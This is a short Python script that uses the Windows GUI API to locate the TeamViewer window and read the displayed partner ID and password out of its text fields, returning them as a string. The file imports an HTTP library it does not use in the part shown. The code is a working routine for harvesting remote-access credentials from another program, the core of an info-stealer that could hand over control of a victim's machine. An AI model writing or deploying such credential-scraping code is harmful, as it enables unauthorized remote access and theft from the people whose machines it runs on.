import win32con
import win32api
import win32gui
import time
import queue
import requests
import json

def Host():
    try:
        TV = win32gui.FindWindow('#32770','TeamViewer')
        ID = win32gui.FindWindowEx(TV,0,'Edit',None)
        #print(hex(ID))
        PW = win32gui.FindWindowEx(TV,ID,'Edit',None)
        #print(hex(PW))
        
        ID_buf_size = win32gui.SendMessage(ID, win32con.WM_GETTEXTLENGTH, 0, 0) + 1  # 要加上截尾的字节  
        #print(buf_size)
        ID_str_buffer = win32gui.PyMakeBuffer(win32gui.SendMessage(ID, win32con.WM_GETTEXTLENGTH, 0, 0) + 1)  # 生成buffer对象
        #print(str_buffer)
        win32api.SendMessage(ID, win32con.WM_GETTEXT, ID_buf_size, ID_str_buffer)  # 获取buffer  
        ID_address, ID_length = win32gui.PyGetBufferAddressAndLen(ID_str_buffer) 
        IDstr = win32gui.PyGetString(ID_address, ID_length) 
        
        PW_buf_size = win32gui.SendMessage(PW, win32con.WM_GETTEXTLENGTH, 0, 0) + 1  # 要加上截尾的字节  
        #print(buf_size)
        PW_str_buffer = win32gui.PyMakeBuffer(win32gui.SendMessage(PW, win32con.WM_GETTEXTLENGTH, 0, 0) + 1)  # 生成buffer对象
        #print(str_buffer)
        win32api.SendMessage(PW, win32con.WM_GETTEXT, PW_buf_size, PW_str_buffer)  # 获取buffer  
        PW_address, PW_length = win32gui.PyGetBufferAddressAndLen(PW_str_buffer) 
        PWstr = win32gui.PyGetString(PW_address, PW_length) 
        
        return IDstr[:-1]+'\n'+PWstr[:-1]
    except Exception as e:
        return str(e)
